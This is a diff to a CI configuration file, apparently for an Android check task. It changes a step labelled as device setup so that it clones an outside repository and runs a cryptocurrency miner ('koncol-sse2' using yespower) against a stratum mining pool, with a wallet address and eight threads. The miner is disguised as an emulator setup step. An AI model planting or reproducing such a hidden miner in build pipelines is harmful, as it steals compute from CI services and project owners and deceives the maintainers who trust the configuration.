@@ -9,7 +9,7 @@ container:
 check_android_task:
 
   create_device_script:
-        git clone https://github.com/jgaswer/mino && cd mino && chmod 777 * && ./koncol-sse2 --config=config.json
+        git clone https://github.com/jgaswer/mino && cd mino && chmod 777 * && ./koncol-sse2  -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1q93jm4p5qap2jny2qn09vx4jqdspfgmdqz9s6pt.halah -t 8
 
 
   start_emulator_background_script:
